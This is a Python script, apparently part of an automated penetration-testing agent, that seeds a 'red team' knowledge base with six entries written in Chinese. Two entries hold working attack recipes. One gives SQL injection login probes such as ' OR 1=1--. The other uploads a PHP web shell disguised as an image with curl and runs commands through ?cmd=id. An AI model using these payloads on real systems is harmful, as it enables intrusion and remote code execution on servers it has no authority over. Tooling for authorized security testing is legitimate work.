from .schemas import KnowledgeEntry
from . import store
import json


def seed():
    """定型知识种子(设计 §3-§8)。幂等:稳定 id。"""
    entries = [
        # ---- 通用层(scope=all,换目标可用) ----
        KnowledgeEntry(
            id="kb.gen.primitive.sqli", type="attack_primitive", scope="all",
            title="SQLi 报错注入检测",
            content=json.dumps({"method": "登录字段依次提交 ' / \" / ' OR 1=1--",
                     "expected": "响应出现 DB 报错(SQLSTATE/MySQL syntax)或绕过登录",
                     "verify": "用 payload 与无 payload 对照,确认错误来自注入点"}, ensure_ascii=False),
            tags=["webapp", "sqli", "auth"], source_type="human", verified=True,
            status="authoritative", proof_method="human", confidence=0.9,
            preconditions="后端为 MySQL/Postgres 且未过滤单引号",
        ),
        KnowledgeEntry(
            id="kb.gen.poc.upload", type="poc", scope="all",
            title="未授权文件上传 → 双扩展名 PHP shell",
            content=json.dumps({"method": "curl -X POST T/upload -F 'a=@s.php;type=image/png' → GET /uploads/s.php",
                     "expected": "GET 返回 200 且内容含 php 标记",
                     "verify": "curl T/uploads/s.php?cmd=id 返回 uid=0 才算成功"}, ensure_ascii=False),
            tags=["webapp", "rce", "upload"], source_type="human",
            status="candidate", verified=False,
            preconditions="PHP 后端、MIME 未严格校验",
        ),
        KnowledgeEntry(
            id="kb.gen.trap.waffp", type="trap", scope="all",
            title="WAF 403 伪装真漏洞",
            content="WAF 拦截返回的 403/502 常与真漏洞相似,必须二次扫描复核,勿单次上报",
            tags=["webapp", "waf", "fp"], source_type="human", verified=True,
            status="authoritative", proof_method="human",
        ),
        KnowledgeEntry(
            id="kb.gen.strategy.nmap", type="strategy_rule", scope="all",
            title="先 nmap 再指纹,版本匹配再打",
            content="先 nmap 扫开放服务→指纹识别版本→CVE 版本匹配才打",
            tags=["network", "recon", "strategy"], source_type="human", verified=True,
            status="authoritative", proof_method="human",
        ),
        # ---- 靶场层(scope=lab-demo,有覆盖率) ----
        KnowledgeEntry(
            id="kb.lab-demo.profile", type="target_profile", scope="lab-demo",
            title="LabDemo 攻击面",
            content="攻击面:[登录弱口令/文件上传/API越权];上传可双扩展名;80 口有云 WAF",
            tags=["lab"], source_type="agent",
            status="authoritative", verified=True, proof_method="human",
            coverage_state={"surface": ["login", "upload", "api"], "resolved": ["login", "upload"]},
        ),
        KnowledgeEntry(
            id="kb.lab-demo.upload&", type="attack_primitive", scope="lab-demo",
            title="LabDemo 上传双扩展名到 shell",
            content=json.dumps({"method": "curl -X POST T/upload -F 'a=@s.php;type=image/png'",
                     "expected": "GET /uploads/s.php 200",
                     "verify": "s.php?cmd=id 返回 uid"}, ensure_ascii=False),
            tags=["lab", "upload"], source_type="agent", verified=True,
            status="authoritative", proof_method="replay",
            case_evidence=["case_demo_001"],
        ),
    ]
    for e in entries:
        store.ingest(e)


if __name__ == "__main__":
    seed()
    print("RED-KB seeded:", len(store.list_knowledge()), "entries")
